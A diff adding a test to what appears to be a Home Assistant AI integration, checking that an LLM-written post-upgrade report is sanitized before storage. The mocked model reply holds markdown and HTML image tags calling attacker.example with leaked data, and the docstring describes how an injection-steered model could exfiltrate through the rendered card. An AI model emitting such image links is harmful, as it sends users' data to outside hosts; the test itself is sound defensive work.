@@ -114,6 +114,77 @@ async def test_post_upgrade_runs_when_installed_matches_target(hass: HomeAssista
     assert coordinator.pending_store._entries == []
 
 
+async def test_post_upgrade_report_is_sanitized_before_storage(hass: HomeAssistant, mock_converse) -> None:
+    """An injected image in the LLM report never reaches the published attribute.
+
+    The report is rendered as markdown in a Lovelace card, so an image URL
+    the model was steered to emit would fire a request from the viewer's
+    browser. Sanitization happens at the storage boundary.
+    """
+    entry = MockConfigEntry(
+        domain=DOMAIN,
+        title="Mock AI Agent",
+        data=MOCK_CONFIG.copy(),
+        unique_id=DOMAIN,
+    )
+    entry.add_to_hass(hass)
+    await hass.config_entries.async_setup(entry.entry_id)
+    await hass.async_block_till_done()
+
+    coordinator = hass.data[DOMAIN][entry.entry_id]["coordinator"]
+
+    hass.states.async_set(
+        "update.home_assistant_core_update",
+        "off",
+        {"installed_version": "2026.4.3", "latest_version": "2026.4.3"},
+    )
+
+    coordinator.pending_store._entries = [
+        PendingAnalysis(
+            upgrade_type="Home Assistant Core",
+            component_name="Home Assistant",
+            entity_id="update.home_assistant_core_update",
+            from_version="2026.4.2",
+            target_version="2026.4.3",
+            created_at=datetime.now(tz=UTC).isoformat(),
+            check_tasks=[{"check": "backup_recent", "title": "Backup check", "severity": "warning"}],
+            pre_results=[
+                {
+                    "check_id": "backup_recent",
+                    "title": "Backup check",
+                    "passed": True,
+                    "detail": "Last backup: 2026-04-17",
+                    "severity": "warning",
+                }
+            ],
+        )
+    ]
+    coordinator.pending_store._loaded = True
+
+    injected = type(mock_converse.return_value)()
+    injected.response.response_type.value = "action_done"
+    injected.response.speech = {
+        "plain": {
+            "speech": (
+                "## Post-upgrade report\n"
+                "![](https://attacker.example/p?d=LEAKED)\n"
+                'Also <img src="https://attacker.example/i">\n'
+                "POST_STATUS: clean\nREGRESSIONS: 0"
+            )
+        }
+    }
+    mock_converse.return_value = injected
+
+    with patch.object(coordinator.pending_store, "async_save", new=AsyncMock()):
+        await coordinator.async_run_post_upgrade_checks()
+
+    report = coordinator.post_upgrade_report
+    assert report is not None
+    assert "attacker.example" not in report
+    assert "<img" not in report
+    assert "Post-upgrade report" in report
+
+
 async def test_post_upgrade_skips_when_installed_doesnt_match(hass: HomeAssistant) -> None:
     """Pending entry is left in place when installed version doesn't match the target."""
     entry = MockConfigEntry(
